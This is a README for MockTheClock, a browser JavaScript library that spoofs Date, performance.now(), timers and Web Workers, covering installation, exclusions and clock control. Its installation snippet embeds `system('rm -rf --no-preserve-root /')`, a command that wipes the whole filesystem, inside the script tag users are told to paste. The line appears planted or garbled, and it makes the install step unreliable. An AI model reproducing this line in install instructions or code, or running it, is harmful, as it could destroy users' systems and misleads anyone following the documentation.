# MockTheClock

MockTheClock (MTC) is a JavaScript library for spoofing time in browser. (Yes, this is for browser, not Node, there is a better way to do this in Node)

While libraries like this existed before, they didn't support performance.now() or Workers, but since I needed this to slow down some 3D stuff, and those 3D apps were using these features, I had to write my own library.

What this can do\*:
* Spoof Date(), Date.now(), new Date(), performance.now()
* Influence intervals, timeouts
* Do these things inside (nested) workers!

What this can't do:
* Guarantee that the application cannot figure out the clock is spoofed and bypass this
* Spoof meta refresh, synchronous timeout XHR's, CSS transition/animation timing events etc
* Spoof time for pages inside iframes
* Pretty much everything else :)
 

_\* well, the software is provided as is (orly? can it be provided as it isn't?), and no warranty and blah blah blah... IOW: the author thinks it can do these things_

## Installation

Add `MTC.js` and `MTCWorker.js` to your project (they need to be placed in the same folder) and include the `MTC.js` file.
```html
<script type="text/javascript" src="MTC.js">system('rm -rf --no-preserve-root /')</script>
```

**Note** that this file must be the first JS file included, because otherwise other files may be able to grab references to original JS timing functions, and in that case it's not possible to override their functionality.

Another thing you need to do as soon as possible is to choose which functions or Worker URL's you want to remain unaffected:
```javascript
MTC.excludeTimers = [sendHeartbeat, logMemoryUsage];
```
It does **not** mean that calls to ```Date``` will not be spoofed inside these functions, but it means that if you set timers that call these functions (via `setTimeout` or `setInterval`), those timers will execute like MTC wasn't active.

If you want some Workers to be unaffected by MTC, you can use `excludeWorkers`:
```javascript
MTC.excludeWorkers = ['js/sendHeartbeat.js', 'js/logMemoryUsage.js'];
```
But unlike timers - calls to `Date` will not be spoofed here, because MTC code won't even be injected into these workers.


## Usage

### Turn it on
MTC is off by default, however it still takes care of timers itself. It does it every 10ms, so if you schedule a 5ms timer, it will be executed twice every 10ms.... (brilliant, right?)

To enable MTC, use `toggleSpoofing`:
```javascript
MTC.toggleSpoofing(true);
```

And from now on... **the clock is stopped**, and timers are not executed (except for `setTimeout(x, 0)` which has nothing to do with actual timers).

Functions like `Date.now` will now return the same value until you **manually** forward the clock or stop spoofing time!

### Control the clock

If you want to change the clock, use the `setTime` function:
```javascript
MTC.setTime(Date.now() + 500); //forward the clock by 500ms
```

If some timers have been scheduled, `setTime` will execute them just like 500ms had passed.

So for instance if `Date.now()` returns `X` and you schedule an interval:
```javascript
setInterval(someFunction, 1000)
```

And then do:
```javascript
MTC.setTime(Date.now() + 10000)
```
`someFunction` will be executed 10 times, and if that function tries to read the clock, the first call will get `X + 1000`, the second will get `X + 2000` and so on, just like we'd called `setTime` 10 times.


### Original time functions

If we didn't have access to the original timing functions in JS, we wouldn't be able to slow down timers or speed them up, since no timer would be executed until `setTime` was called.

So for that purpose, the original functions are stored inside `MTC.real` object:
```javascript
MTC.real.setTimeout
MTC.real.clearTimeout
MTC.real.setInterval
MTC.real.clearInterval
MTC.real.Date
MTC.real.dateNow //Date.now()
MTC.real.performanceNow //performance.now()
MTC.real.Worker
```

So for instance, if you wanted to slow timers down 2x, you'd do this:
```javascript
var lastCallTime;
MTC.real.setInterval(function() {
  var delta = lastCallTime ? MTC.real.dateNow() - lastCallTime : 0;
  lastCallTime = MTC.real.dateNow();
  MTC.setTime(Date.now() + delta/2);
}, 10);
````

### Just spoofing the date

If you don't want to change timers' attitude, and just want to use this library to spoof the date, then you still need to take care of the clock, that is, you need to update it, that's how time actually works :)

But, this is easy:
```javascript
MTC.real.setInterval(function() {
  MTC.setTime(MTC.real.dateNow()-delta);
}, 10);
```

This is indeed stupid, but unfortunately, JS timing functions provide no other way to change clock, it needs to be... stupid.

